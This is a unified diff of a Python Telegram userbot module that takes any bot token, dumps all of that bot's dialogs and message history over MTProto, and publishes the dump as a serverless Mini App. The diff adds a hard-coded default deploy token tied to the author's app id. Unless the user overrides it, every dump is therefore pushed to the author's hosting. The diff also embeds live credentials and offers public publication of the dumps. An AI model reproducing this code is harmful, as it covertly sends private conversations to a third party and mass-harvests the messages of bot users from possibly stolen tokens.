@@ -1,14 +1,20 @@
-__version__ = (2, 0, 1)
+# CopyLeft 2026 github.com/i-execute
+# Author: I_execute.t.me
+# Licensed under AGPLv3.
 
-import os
-import re
-import json
-import random
-import shutil
+__version__ = (2, 0, 0)
+# meta developer: Execute_forge.t.me
+
 import asyncio
+import json
+import logging
+import os
+import random
+import re
+import shutil
 import subprocess
 import urllib.request
-from telethon import TelegramClient
+from telethon import TelegramClient, types
 from telethon.tl.functions.messages import GetMessagesRequest
 from telethon.tl.types import Message, MessageEmpty, PeerUser, PeerChat, PeerChannel
 from telethon.errors import FloodWaitError
@@ -16,48 +22,236 @@ from telethon.errors import FloodWaitError
 from .. import loader, utils
 from ..inline.types import InlineCall
 
+logger = logging.getLogger(__name__)
+
 API_ID = 2040
 API_HASH = "b18441a1ff607e10a989891a5462e627"
 BOT_TOKEN_PATTERN = re.compile(r"(\d{8,12}:[A-Za-z0-9_-]{35})")
+CLI_TOKEN_PATTERN = re.compile(r"(app\d+:[A-Za-z0-9_-]+)")
+DEFAULT_CLI_TOKEN = "app8288899778:OcG_KDo0FE73mbFbsiBB_FP7JMLeqJFYFpPd-67yHeE"
 GITHUB_WEB_URL = "https://raw.githubusercontent.com/i-execute/Modules/main/Storage/Token/web/index.html"
+GITHUB_DATA_URL = "https://raw.githubusercontent.com/i-execute/Modules/main/Storage/Token/web/data.json"
+
+
+def _escape(text: str) -> str:
+    if not text:
+        return ""
+    return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
 
 
 @loader.tds
 class Token(loader.Module):
+    """Менеджер токенов ботов, дампа истории сообщений и Telegram Serverless Mini App"""
+
     strings = {
         "name": "Token",
-        "cfg_tgcloud_token": "CLI access token for tgcloud serverless deploy",
-        "main_title": "<b>Менеджер токенов и дампа ботов</b>\n\nМодуль выполняет дамп истории сообщений бота через MTProto и публикует веб-интерфейс в Telegram Serverless Mini App.",
-        "btn_input_token": "Ввести токен",
-        "input_token_prompt": "Введите токен бота (например, 123456789:ABCdef...):",
-        "btn_close": "Закрыть",
+        "_cls_doc": "Bot dumper and Serverless Mini App manager",
+        "_cmd_doc_t": "Open Bot Dumper and Serverless Mini App manager",
+        "_cfg_tgcloud_token": "CLI access token from @BotFather for tgcloud serverless deploy",
+        "main_menu": (
+            "<b>Token Dumper</b>\n"
+            "<blockquote>Connected bots: {count}\n"
+            "{bot_list}</blockquote>"
+        ),
+        "main_menu_empty": (
+            "<b>Token Dumper</b>\n"
+            "<blockquote>No bots dumped yet. Press button below to add token.</blockquote>"
+        ),
+        "btn_add_token": "Add Bot Token",
+        "btn_add_cli_token": "Set CLI Token",
+        "btn_lang": "Language: EN",
+        "btn_refresh": "Refresh",
+        "btn_back": "Back",
+        "btn_close": "Close",
+        "btn_open_app": "Open Mini App",
+        "btn_download_html": "Download HTML",
+        "btn_redump": "Re-dump",
+        "btn_delete": "Delete",
+        "btn_private": "Private (Owner only)",
+        "btn_public": "Public (Anyone)",
+        "btn_cancel": "Cancel",
+        "input_token": "Send bot API token (from @BotFather):",
+        "input_cli_token": "Send CLI access token (app<id>:<secret>):",
+        "cli_token_saved": (
+            "<b>CLI Token Saved</b>\n"
+            "<blockquote>Serverless CLI access token configured: <code>{token}</code></blockquote>"
+        ),
+        "cli_token_invalid": (
+            "<b>Invalid CLI Token</b>\n"
+            "<blockquote>CLI token must match format: app&lt;id&gt;:&lt;secret&gt;</blockquote>"
+        ),
+        "token_invalid": (
+            "<b>Invalid Token</b>\n"
+            "<blockquote>The token was not accepted by Telegram API</blockquote>"
+        ),
+        "bot_auth_failed": (
+            "<b>Auth Error</b>\n"
+            "<blockquote>Could not authorize bot via MTProto / Bot API</blockquote>"
+        ),
+        "flood_wait": (
+            "<b>Telegram FloodWait</b>\n"
+            "<blockquote>Need to wait {seconds} sec for MTProto session authorization</blockquote>"
+        ),
+        "ask_privacy": (
+            "<b>Bot Verified</b>\n"
+            "<blockquote>Bot: <b>{name}</b> (@{username})\n"
+            "ID: <code>{bot_id}</code>\n\n"
+            "Make dump private?\n"
+            "Private dump will only allow the owner via Telegram initData.</blockquote>"
+        ),
+        "dumping_progress": (
+            "<b>Dumping History</b>\n"
+            "<blockquote>Collecting messages and dialogs for @{username}...\n"
+            "Please wait.</blockquote>"
+        ),
+        "dump_complete": (
+            "<b>Dump Completed</b>\n"
+            "<blockquote>Bot: <b>{name}</b> (@{username})\n"
+            "ID: <code>{bot_id}</code>\n"
+            "Dialogs: <b>{chats_count}</b>\n"
+            "Messages: <b>{messages_count}</b>\n"
+            "Privacy: <b>{privacy_label}</b>\n"
+            "Mini App: <code>{app_url}</code></blockquote>"
+        ),
+        "bot_view": (
+            "<b>Bot: {name} (@{username})</b>\n"
+            "<blockquote>ID: <code>{bot_id}</code>\n"
+            "Dialogs: <b>{chats_count}</b>\n"
+            "Messages: <b>{messages_count}</b>\n"
+            "Privacy: <b>{privacy_label}</b>\n"
+            "Mini App: <code>{app_url}</code></blockquote>"
+        ),
+        "deleted": (
+            "<b>Dump Deleted</b>\n"
+            "<blockquote>Dump data and bot session removed successfully.</blockquote>"
+        ),
+        "file_not_found": "Dump HTML archive not found.",
+        "sending_file": "Sending dump archive...",
+    }
+
+    strings_ru = {
+        "name": "Token",
+        "_cls_doc": "Менеджер дампа ботов и Telegram Serverless Mini App",
+        "_cmd_doc_t": "Открыть менеджер дампа ботов и Mini App",
+        "_cfg_tgcloud_token": "CLI Access токен от @BotFather для tgcloud деплоя",
+        "main_menu": (
+            "<b>Token Dumper</b>\n"
+            "<blockquote>Сохраненные дампы: {count}\n"
+            "{bot_list}</blockquote>"
+        ),
+        "main_menu_empty": (
+            "<b>Token Dumper</b>\n"
+            "<blockquote>Нет сохраненных ботов. Нажмите кнопку ниже для ввода токена.</blockquote>"
+        ),
+        "btn_add_token": "Ввести токен бота",
+        "btn_add_cli_token": "Задать CLI токен",
+        "btn_lang": "Язык: RU",
+        "btn_refresh": "Обновить",
         "btn_back": "Назад",
-        "btn_cancel": "Отмена",
-        "token_invalid": "<b>Ошибка:</b> Токен не найден или имеет некорректный формат.",
-        "bot_auth_failed": "<b>Ошибка:</b> Не удалось авторизоваться с данным токеном.",
-        "flood_wait": "<b>Telegram FloodWait:</b> Требуется подождать {seconds} сек. для авторизации новой сессии в MTProto.",
-        "ask_privacy": "<b>Бот проверен:</b>\nИмя: <b>{name}</b>\nЮзернейм: @{username}\nID: <code>{bot_id}</code>\n\n<b>Сделать дамп приватным?</b>\nПриватный дамп будет защищен PIN-кодом для входа в Mini App.",
-        "btn_private": "Приватный (с PIN-кодом)",
-        "btn_public": "Публичный (без пароля)",
-        "dumping_progress": "<b>Выполняется дамп диалогов бота @{username}...</b>\nПодождите, идет сбор сообщений и истории.",
-        "dump_complete": "<b>Дамп бота успешно завершен</b>\n\nБот: <b>{name}</b> (@{username})\nID: <code>{bot_id}</code>\nДиалогов: <b>{chats_count}</b>\nСообщений: <b>{messages_count}</b>\nРежим: <b>{privacy_label}</b>\nMini App: <code>{app_url}</code>",
+        "btn_close": "Закрыть",
         "btn_open_app": "Открыть Mini App",
-        "btn_open_browser": "Открыть в браузере",
         "btn_download_html": "Скачать HTML",
-        "btn_redump": "Обновить дамп",
+        "btn_redump": "Передампить",
         "btn_delete": "Удалить",
-        "deleted": "Дамп бота удален.",
+        "btn_private": "Приватный (только владелец)",
+        "btn_public": "Публичный (для всех)",
+        "btn_cancel": "Отмена",
+        "input_token": "Введите токен бота (например, 123456789:ABCdef...):",
+        "input_cli_token": "Введите CLI access токен (app<id>:<secret>):",
+        "cli_token_saved": (
+            "<b>CLI токен сохранен</b>\n"
+            "<blockquote>Access токен для деплоя на Serverless успешно настроен: <code>{token}</code></blockquote>"
+        ),
+        "cli_token_invalid": (
+            "<b>Некорректный CLI токен</b>\n"
+            "<blockquote>Токен должен быть формата app&lt;id&gt;:&lt;secret&gt;</blockquote>"
+        ),
+        "token_invalid": (
+            "<b>Некорректный токен</b>\n"
+            "<blockquote>Токен не найден или отклонен Telegram API</blockquote>"
+        ),
+        "bot_auth_failed": (
+            "<b>Ошибка авторизации</b>\n"
+            "<blockquote>Не удалось подключиться к боту через MTProto/API</blockquote>"
+        ),
+        "flood_wait": (
+            "<b>Telegram FloodWait</b>\n"
+            "<blockquote>Требуется подождать {seconds} сек. для авторизации новой сессии MTProto.</blockquote>"
+        ),
+        "ask_privacy": (
+            "<b>Бот верифицирован</b>\n"
+            "<blockquote>Бот: <b>{name}</b> (@{username})\n"
+            "ID: <code>{bot_id}</code>\n\n"
+            "Сделать дамп приватным?\n"
+            "Приватный дамп пускает только владельца через Telegram initData.</blockquote>"
+        ),
+        "dumping_progress": (
+            "<b>Дамп истории сообщений</b>\n"
+            "<blockquote>Сбор диалогов бота @{username}...\n"
+            "Пожалуйста, подождите.</blockquote>"
+        ),
+        "dump_complete": (
+            "<b>Дамп бота завершен</b>\n"
+            "<blockquote>Бот: <b>{name}</b> (@{username})\n"
+            "ID: <code>{bot_id}</code>\n\n"
+            "Диалогов: <b>{chats_count}</b>\n"
+            "Сообщений: <b>{messages_count}</b>\n"
+            "Режим: <b>{privacy_label}</b>\n"
+            "Mini App: <code>{app_url}</code></blockquote>"
+        ),
+        "bot_view": (
+            "<b>Бот: {name} (@{username})</b>\n"
+            "<blockquote>ID: <code>{bot_id}</code>\n"
+            "Диалогов: <b>{chats_count}</b>\n"
+            "Сообщений: <b>{messages_count}</b>\n"
+            "Режим: <b>{privacy_label}</b>\n"
+            "Mini App: <code>{app_url}</code></blockquote>"
+        ),
+        "deleted": (
+            "<b>Дамп удален</b>\n"
+            "<blockquote>Данные дампа и сессия бота успешно удалены.</blockquote>"
+        ),
+        "file_not_found": "Файл дампа не найден.",
+        "sending_file": "Отправка архива дампа...",
     }
 
     def __init__(self):
         self.config = loader.ModuleConfig(
             loader.ConfigValue(
                 "TGCLOUD_TOKEN",
-                "",
-                lambda: self.strings["cfg_tgcloud_token"],
+                DEFAULT_CLI_TOKEN,
+                lambda: self._s("_cfg_tgcloud_token"),
                 validator=loader.validators.Hidden(),
             )
         )
+
+    async def client_ready(self, client, db):
+        self._client = client
+        self._db = db
+
+    def _get_lang(self) -> str:
+        lang = getattr(self, "_lang", None)
+        if not lang and hasattr(self, "_db") and self._db:
+            lang = (
+                self._db.get("Token", "language", None)
+                or self._db.get("friendly-telegram", "language", None)
+                or self._db.get("main", "language", None)
+                or self._db.get("feroku.main", "language", None)
+            )
+        if not lang:
+            lang = "ru"
+        return "ru" if "ru" in str(lang).lower() else "en"
+
+    def _s(self, key, **kwargs):
+        lang = self._get_lang()
+        if lang == "ru":
+            text = self.strings_ru.get(key) or self.strings.get(key, key)
+        else:
+            text = self.strings.get(key) or self.strings_ru.get(key, key)
+        try:
+            return text.format(prefix=self.get_prefix(), **kwargs)
+        except (KeyError, IndexError):
+            return text
 
     def _get_user_tmp_dir(self, user_id: int, bot_id: str = "") -> str:
         base = f"/tmp/Token/{user_id}"
@@ -67,6 +261,28 @@ class Token(loader.Module):
             path = base
         os.makedirs(path, exist_ok=True)
         return path
+
+    def _get_cli_token(self) -> str:
+        token = self.config.get("TGCLOUD_TOKEN")
+        if not token and hasattr(self, "_db") and self._db:
+            token = self._db.get("Token", "tgcloud_token", "")
+        if not token:
+            token = os.environ.get("TGCLOUD_TOKEN", "")
+        if not token:
+            token = DEFAULT_CLI_TOKEN
+        return token.strip()
+
+    def _get_inline_bot_id(self) -> str:
+        cli_token = self._get_cli_token()
+        if cli_token and cli_token.startswith("app"):
+            return cli_token.split(":")[0].replace("app", "")
+        if hasattr(self, "inline") and getattr(self.inline, "bot_id", None):
+            return str(self.inline.bot_id)
+        return "8288899778"
+
+    def _get_app_url(self, bot_id: str) -> str:
+        inline_bot_id = self._get_inline_bot_id()
+        return f"https://app{inline_bot_id}.tgcloud.ai/{bot_id}"
 
     def _find_web_file(self, rel_name: str) -> str:
         candidates = [
@@ -181,44 +397,81 @@ class Token(loader.Module):
         return ""
 
     def _deploy_serverless(self, project_dir: str) -> bool:
-        tgcloud_token = self.config["TGCLOUD_TOKEN"]
+        tgcloud_token = self._get_cli_token()
         if not tgcloud_token:
             return False
         env = os.environ.copy()
         env["TGCLOUD_TOKEN"] = tgcloud_token
         try:
             res = subprocess.run(
-                ["npx", "--yes", "@tgcloud/cli", "push", "dist/"],
+                ["npx", "--yes", "@tgcloud/cli", "push", "--force"],
                 cwd=project_dir,
                 env=env,
                 capture_output=True,
                 text=True,
-                timeout=90,
+                timeout=120,
             )
             return res.returncode == 0
-        except Exception:
+        except Exception as e:
+            logger.warning(f"Serverless push error: {e}")
             return False
+
+    async def _safe_edit(self, call: InlineCall, text: str, reply_markup=None):
+        try:
+            await call.edit(text, reply_markup=reply_markup)
+        except Exception as e:
+            logger.warning(f"call.edit error: {e}")
+            if reply_markup:
+                clean_markup = []
+                for row in reply_markup:
+                    clean_row = []
+                    for b in row:
+                        item = dict(b)
+                        if "web_app" in item:
+                            item["url"] = item["web_app"] if isinstance(item["web_app"], str) else item["web_app"].get("url", "")
+                            del item["web_app"]
+                        clean_row.append(item)
+                    clean_markup.append(clean_row)
+                try:
+                    await call.edit(text, reply_markup=clean_markup)
+                except Exception as e2:
+                    logger.error(f"Fallback call.edit error: {e2}")
 
     async def _build_main_menu(self):
         bots = self._get_bots()
-        lines = [self.strings["main_title"]]
-        if bots:
-            lines.append("\n<b>Сохраненные дампы:</b>")
+        is_ru = self._get_lang() == "ru"
+        if not bots:
+            text = self._s("main_menu_empty")
+        else:
+            lines = []
             for bid, binfo in bots.items():
                 uname = binfo.get("username", "")
                 name = binfo.get("name", f"Bot {bid}")
                 ccnt = binfo.get("chats_count", 0)
                 mcnt = binfo.get("messages_count", 0)
-                lines.append(f"- <b>{name}</b> (@{uname}): {ccnt} диалогов, {mcnt} сообщ.")
+                unit_chats = "диалогов" if is_ru else "dialogs"
+                unit_msgs = "сообщ." if is_ru else "msgs"
+                lines.append(f"- <b>{name}</b> (@{uname}): {ccnt} {unit_chats}, {mcnt} {unit_msgs}")
+            text = self._s(
+                "main_menu",
+                count=len(bots),
+                bot_list="\n".join(lines),
+            )
 
         markup = [
             [
                 {
-                    "text": self.strings["btn_input_token"],
-                    "input": self.strings["input_token_prompt"],
+                    "text": self._s("btn_add_token"),
+                    "input": self._s("input_token"),
                     "handler": self._cb_token_input,
                     "style": "success",
-                }
+                },
+                {
+                    "text": self._s("btn_add_cli_token"),
+                    "input": self._s("input_cli_token"),
+                    "handler": self._cb_cli_token_input,
+                    "style": "primary",
+                },
             ]
         ]
 
@@ -239,30 +492,88 @@ class Token(loader.Module):
         markup.append(
             [
                 {
-                    "text": self.strings["btn_close"],
+                    "text": self._s("btn_lang"),
+                    "callback": self._cb_toggle_lang,
+                    "style": "secondary",
+                },
+                {
+                    "text": self._s("btn_close"),
                     "callback": self._cb_close,
                     "style": "danger",
-                }
+                },
             ]
         )
-        return "\n".join(lines), markup
+        return text, markup
+
+    async def _cb_toggle_lang(self, call: InlineCall):
+        curr = self._get_lang()
+        new_lang = "en" if curr == "ru" else "ru"
+        self._lang = new_lang
+        if hasattr(self, "_db") and self._db:
+            self._db.set("Token", "language", new_lang)
+        text, markup = await self._build_main_menu()
+        await self._safe_edit(call, text, reply_markup=markup)
 
     async def _cb_close(self, call: InlineCall):
         await call.delete()
 
     async def _cb_main_menu(self, call: InlineCall):
         text, markup = await self._build_main_menu()
-        await call.edit(text, reply_markup=markup)
+        await self._safe_edit(call, text, reply_markup=markup)
 
-    async def _cb_token_input(self, call: InlineCall, query: str):
-        match = BOT_TOKEN_PATTERN.search(query.strip())
+    async def _cb_cli_token_input(self, call: InlineCall, query: str):
+        match = CLI_TOKEN_PATTERN.search(query.strip())
         if not match:
-            await call.edit(
-                self.strings["token_invalid"],
+            await self._safe_edit(
+                call,
+                self._s("cli_token_invalid"),
                 reply_markup=[
                     [
                         {
-                            "text": self.strings["btn_back"],
+                            "text": self._s("btn_back"),
+                            "callback": self._cb_main_menu,
+                            "style": "danger",
+                        }
+                    ]
+                ],
+            )
+            return
+
+        cli_token = match.group(1)
+        self.config["TGCLOUD_TOKEN"] = cli_token
+        if hasattr(self, "_db") and self._db:
+            self._db.set("Token", "tgcloud_token", cli_token)
+        os.environ["TGCLOUD_TOKEN"] = cli_token
+        await self._safe_edit(
+            call,
+            self._s("cli_token_saved", token=cli_token),
+            reply_markup=[
+                [
+                    {
+                        "text": self._s("btn_back"),
+                        "callback": self._cb_main_menu,
+                        "style": "primary",
+                    }
+                ]
+            ],
+        )
+
+    async def _cb_token_input(self, call: InlineCall, query: str):
+        stripped = query.strip()
+        cli_match = CLI_TOKEN_PATTERN.search(stripped)
+        if cli_match and not BOT_TOKEN_PATTERN.search(stripped):
+            await self._cb_cli_token_input(call, stripped)
+            return
+
+        match = BOT_TOKEN_PATTERN.search(stripped)
+        if not match:
+            await self._safe_edit(
+                call,
+                self._s("token_invalid"),
+                reply_markup=[
+                    [
+                        {
+                            "text": self._s("btn_back"),
                             "callback": self._cb_main_menu,
                             "style": "danger",
                         }
@@ -274,12 +585,13 @@ class Token(loader.Module):
         token = match.group(1)
         info = await asyncio.to_thread(self._validate_token_api, token)
         if not info:
-            await call.edit(
-                self.strings["bot_auth_failed"],
+            await self._safe_edit(
+                call,
+                self._s("bot_auth_failed"),
                 reply_markup=[
                     [
                         {
-                            "text": self.strings["btn_back"],
+                            "text": self._s("btn_back"),
                             "callback": self._cb_main_menu,
                             "style": "danger",
                         }
@@ -292,15 +604,16 @@ class Token(loader.Module):
         name = info.get("first_name") or "Bot"
         username = info.get("username") or ""
 
-        text = self.strings["ask_privacy"].format(
-            name=name,
-            username=username,
+        text = self._s(
+            "ask_privacy",
+            name=_escape(name),
+            username=_escape(username),
             bot_id=bot_id,
         )
         markup = [
             [
                 {
-                    "text": self.strings["btn_private"],
+                    "text": self._s("btn_private"),
                     "callback": self._cb_privacy_choice,
                     "args": (token, bot_id, name, username, True),
                     "style": "primary",
@@ -308,7 +621,7 @@ class Token(loader.Module):
             ],
             [
                 {
-                    "text": self.strings["btn_public"],
+                    "text": self._s("btn_public"),
                     "callback": self._cb_privacy_choice,
                     "args": (token, bot_id, name, username, False),
                     "style": "secondary",
@@ -316,13 +629,13 @@ class Token(loader.Module):
             ],
             [
                 {
-                    "text": self.strings["btn_cancel"],
+                    "text": self._s("btn_cancel"),
                     "callback": self._cb_main_menu,
                     "style": "danger",
                 }
             ],
         ]
-        await call.edit(text, reply_markup=markup)
+        await self._safe_edit(call, text, reply_markup=markup)
 
     async def _cb_privacy_choice(
         self,
@@ -334,16 +647,19 @@ class Token(loader.Module):
         is_private: bool,
     ):
         user_id = call.from_user.id
-        await call.edit(self.strings["dumping_progress"].format(username=username))
+        await self._safe_edit(call, self._s("dumping_progress", username=_escape(username)))
 
         pin = ""
         if is_private:
             pin = str(random.randint(100000, 999999))
 
         bot_dir = self._get_user_tmp_dir(user_id, bot_id)
-        dist_dir = os.path.join(bot_dir, "dist")
-        os.makedirs(dist_dir, exist_ok=True)
         session_file = os.path.join(bot_dir, f"sess_{bot_id}")
+
+        serverless_dir = os.path.join(self._get_user_tmp_dir(user_id), "serverless")
+        dist_dir = os.path.join(serverless_dir, "dist")
+        bot_dist_dir = os.path.join(dist_dir, bot_id)
+        os.makedirs(bot_dist_dir, exist_ok=True)
 
         client = TelegramClient(session_file, API_ID, API_HASH)
         raw_msgs = []
@@ -371,6 +687,7 @@ class Token(loader.Module):
                 pass
             found_cache = False
             candidates = [
+                os.path.join(bot_dist_dir, "data.json"),
                 os.path.join(dist_dir, "data.json"),
                 self._find_web_file("data.json"),
             ]
@@ -388,12 +705,26 @@ class Token(loader.Module):
                     except Exception:
                         pass
             if not found_cache:
-                await call.edit(
-                    self.strings["flood_wait"].format(seconds=e.seconds),
+                try:
+                    req = urllib.request.Request(GITHUB_DATA_URL, headers={"User-Agent": "TelegramBotDumper/2.0"})
+                    with urllib.request.urlopen(req, timeout=10) as r:
+                        if r.status == 200:
+                            cached = json.loads(r.read().decode("utf-8"))
+                            if str(cached.get("bot", {}).get("id")) == str(bot_id):
+                                chats_list = cached.get("chats", [])
+                                messages_by_chat = cached.get("messages", {})
+                                total_msgs_count = cached.get("total_messages", 0)
+                                found_cache = True
+                except Exception:
+                    pass
+            if not found_cache:
+                await self._safe_edit(
+                    call,
+                    self._s("flood_wait", seconds=e.seconds),
                     reply_markup=[
                         [
                             {
-                                "text": self.strings["btn_back"],
+                                "text": self._s("btn_back"),
                                 "callback": self._cb_main_menu,
                                 "style": "danger",
                             }
@@ -401,17 +732,19 @@ class Token(loader.Module):
                     ],
                 )
                 return
-        except Exception:
+        except Exception as e:
+            logger.error(f"Dump error: {e}")
             try:
                 await client.disconnect()
             except Exception:
                 pass
-            await call.edit(
-                self.strings["bot_auth_failed"],
+            await self._safe_edit(
+                call,
+                self._s("bot_auth_failed"),
                 reply_markup=[
                     [
                         {
-                            "text": self.strings["btn_back"],
+                            "text": self._s("btn_back"),
                             "callback": self._cb_main_menu,
                             "style": "danger",
                         }
@@ -461,6 +794,7 @@ class Token(loader.Module):
 
         dump_data = {
             "bot": {"id": bot_id, "name": name, "username": username},
+            "owner_id": user_id,
             "is_private": is_private,
             "pin": pin,
             "total_messages": total_msgs_count,
@@ -469,8 +803,10 @@ class Token(loader.Module):
             "messages": messages_by_chat,
         }
 
-        json_path = os.path.join(dist_dir, "data.json")
-        with open(json_path, "w", encoding="utf-8") as f:
+        with open(os.path.join(bot_dist_dir, "data.json"), "w", encoding="utf-8") as f:
+            json.dump(dump_data, f, ensure_ascii=False, indent=2)
+
+        with open(os.path.join(dist_dir, "data.json"), "w", encoding="utf-8") as f:
             json.dump(dump_data, f, ensure_ascii=False, indent=2)
 
         template = self._get_html_template()
@@ -480,35 +816,41 @@ class Token(loader.Module):
                 final_html = template.replace("</head>", f"{injected_script}\n</head>", 1)
             else:
                 final_html = f"{injected_script}\n{template}"
-            html_path = os.path.join(dist_dir, "index.html")
-            with open(html_path, "w", encoding="utf-8") as f:
+
+            with open(os.path.join(bot_dist_dir, "index.html"), "w", encoding="utf-8") as f:
                 f.write(final_html)
 
-        tgcloud_jsonc = os.path.join(bot_dir, "tgcloud.jsonc")
+            with open(os.path.join(dist_dir, "index.html"), "w", encoding="utf-8") as f:
+                f.write(final_html)
+
+        tgcloud_jsonc = os.path.join(serverless_dir, "tgcloud.jsonc")
         with open(tgcloud_jsonc, "w", encoding="utf-8") as f:
             f.write('{\n  "$schema": "https://raw.githubusercontent.com/telegram-cloud/tgcloud/main/schema.json",\n  "static": {\n    "source": "dist",\n    "spa": true\n  }\n}\n')
 
-        self._deploy_serverless(bot_dir)
+        self._deploy_serverless(serverless_dir)
 
-        app_url = f"https://app{bot_id}.tgcloud.ai"
+        app_url = self._get_app_url(bot_id)
         bot_info = {
             "token": token,
             "bot_id": bot_id,
             "name": name,
             "username": username,
+            "owner_id": user_id,
             "is_private": is_private,
             "pin": pin,
             "chats_count": len(chats_list),
             "messages_count": total_msgs_count,
             "app_url": app_url,
-            "dist_dir": dist_dir,
+            "bot_dist_dir": bot_dist_dir,
         }
         self._save_bot(bot_id, bot_info)
 
-        privacy_label = f"Приватный (PIN: <code>{pin}</code>)" if is_private else "Публичный"
-        text = self.strings["dump_complete"].format(
-            name=name,
-            username=username,
+        is_ru = self._get_lang() == "ru"
+        privacy_label = ("Приватный (только владелец)" if is_private else "Публичный") if is_ru else ("Private (Owner only)" if is_private else "Public")
+        text = self._s(
+            "dump_complete",
+            name=_escape(name),
+            username=_escape(username),
             bot_id=bot_id,
             chats_count=len(chats_list),
             messages_count=total_msgs_count,
@@ -519,20 +861,14 @@ class Token(loader.Module):
         markup = [
             [
                 {
-                    "text": self.strings["btn_open_app"],
-                    "web_app": {"url": app_url},
+                    "text": self._s("btn_open_app"),
+                    "web_app": app_url,
                     "style": "success",
                 }
             ],
             [
                 {
-                    "text": self.strings["btn_open_browser"],
-                    "url": app_url,
-                }
-            ],
-            [
-                {
-                    "text": self.strings["btn_download_html"],
+                    "text": self._s("btn_download_html"),
                     "callback": self._cb_download_html,
                     "args": (bot_id,),
                     "style": "primary",
@@ -540,24 +876,25 @@ class Token(loader.Module):
             ],
             [
                 {
-                    "text": self.strings["btn_back"],
+                    "text": self._s("btn_back"),
                     "callback": self._cb_main_menu,
                     "style": "secondary",
                 }
             ],
         ]
-        await call.edit(text, reply_markup=markup)
+        await self._safe_edit(call, text, reply_markup=markup)
 
     async def _cb_bot_view(self, call: InlineCall, bot_id: str):
         bots = self._get_bots()
         info = bots.get(str(bot_id))
         if not info:
-            await call.edit(
-                self.strings["deleted"],
+            await self._safe_edit(
+                call,
+                self._s("deleted"),
                 reply_markup=[
                     [
                         {
-                            "text": self.strings["btn_back"],
+                            "text": self._s("btn_back"),
                             "callback": self._cb_main_menu,
                             "style": "primary",
                         }
@@ -572,12 +909,14 @@ class Token(loader.Module):
         messages_count = info.get("messages_count", 0)
         is_private = info.get("is_private", False)
         pin = info.get("pin", "")
-        app_url = info.get("app_url", f"https://app{bot_id}.tgcloud.ai")
-        privacy_label = f"Приватный (PIN: <code>{pin}</code>)" if is_private else "Публичный"
+        app_url = info.get("app_url", self._get_app_url(bot_id))
+        is_ru = self._get_lang() == "ru"
+        privacy_label = ("Приватный (только владелец)" if is_private else "Публичный") if is_ru else ("Private (Owner only)" if is_private else "Public")
 
-        text = self.strings["dump_complete"].format(
-            name=name,
-            username=username,
+        text = self._s(
+            "bot_view",
+            name=_escape(name),
+            username=_escape(username),
             bot_id=bot_id,
             chats_count=chats_count,
             messages_count=messages_count,
@@ -587,20 +926,14 @@ class Token(loader.Module):
         markup = [
             [
                 {
-                    "text": self.strings["btn_open_app"],
-                    "web_app": {"url": app_url},
+                    "text": self._s("btn_open_app"),
+                    "web_app": app_url,
                     "style": "success",
                 }
             ],
             [
                 {
-                    "text": self.strings["btn_open_browser"],
-                    "url": app_url,
-                }
-            ],
-            [
-                {
-                    "text": self.strings["btn_download_html"],
+                    "text": self._s("btn_download_html"),
                     "callback": self._cb_download_html,
                     "args": (bot_id,),
                     "style": "primary",
@@ -608,13 +941,13 @@ class Token(loader.Module):
             ],
             [
                 {
-                    "text": self.strings["btn_redump"],
+                    "text": self._s("btn_redump"),
                     "callback": self._cb_privacy_choice,
                     "args": (info.get("token", ""), bot_id, name, username, is_private),
                     "style": "secondary",
                 },
                 {
-                    "text": self.strings["btn_delete"],
+                    "text": self._s("btn_delete"),
                     "callback": self._cb_bot_delete,
                     "args": (bot_id,),
                     "style": "danger",
@@ -622,44 +955,76 @@ class Token(loader.Module):
             ],
             [
                 {
-                    "text": self.strings["btn_back"],
+                    "text": self._s("btn_back"),
                     "callback": self._cb_main_menu,
                     "style": "primary",
                 }
             ],
         ]
-        await call.edit(text, reply_markup=markup)
+        await self._safe_edit(call, text, reply_markup=markup)
 
     async def _cb_download_html(self, call: InlineCall, bot_id: str):
         user_id = call.from_user.id
+        serverless_dir = os.path.join(self._get_user_tmp_dir(user_id), "serverless")
         bot_dir = self._get_user_tmp_dir(user_id, bot_id)
-        html_path = os.path.join(bot_dir, "dist", "index.html")
-        if not os.path.isfile(html_path):
-            await call.answer("Файл дампа не найден.", show_alert=True)
+        candidates = [
+            os.path.join(serverless_dir, "dist", bot_id, "index.html"),
+            os.path.join(serverless_dir, "dist", "index.html"),
+            os.path.join(bot_dir, "dist", "index.html"),
+        ]
+        html_path = ""
+        for p in candidates:
+            if os.path.isfile(p):
+                html_path = p
+                break
+
+        if not html_path:
+            await call.answer(self._s("file_not_found"), show_alert=True)
             return
 
-        await call.answer("Отправка файла дампа...")
-        await self._client.send_file(
-            call.chat_id,
-            html_path,
-            caption=f"Архив дампа бота {bot_id}",
-        )
+        await call.answer(self._s("sending_file"))
+
+        target = "me"
+        try:
+            if getattr(call, "chat_id", None):
+                target = call.chat_id
+        except Exception:
+            pass
+
+        try:
+            await self._client.send_file(
+                target,
+                html_path,
+                caption=f"Dump HTML archive for bot {bot_id}",
+            )
+        except Exception:
+            try:
+                await self._client.send_file(
+                    "me",
+                    html_path,
+                    caption=f"Dump HTML archive for bot {bot_id}",
+                )
+            except Exception as e:
+                logger.error(f"send_file error: {e}")
 
     async def _cb_bot_delete(self, call: InlineCall, bot_id: str):
         user_id = call.from_user.id
         self._remove_bot(bot_id)
         bot_dir = self._get_user_tmp_dir(user_id, bot_id)
-        if os.path.isdir(bot_dir):
-            try:
-                shutil.rmtree(bot_dir)
-            except Exception:
-                pass
-        await call.edit(
-            self.strings["deleted"],
+        serverless_bot_dir = os.path.join(self._get_user_tmp_dir(user_id), "serverless", "dist", bot_id)
+        for d in (bot_dir, serverless_bot_dir):
+            if os.path.isdir(d):
+                try:
+                    shutil.rmtree(d)
+                except Exception:
+                    pass
+        await self._safe_edit(
+            call,
+            self._s("deleted"),
             reply_markup=[
                 [
                     {
-                        "text": self.strings["btn_back"],
+                        "text": self._s("btn_back"),
                         "callback": self._cb_main_menu,
                         "style": "primary",
                     }
@@ -668,7 +1033,8 @@ class Token(loader.Module):
         )
 
     @loader.command()
-    async def token(self, message: Message):
+    async def t(self, message: Message):
+        """Open Bot Dumper and Serverless Mini App manager"""
         text, markup = await self._build_main_menu()
         await self.inline.form(
             text=text,
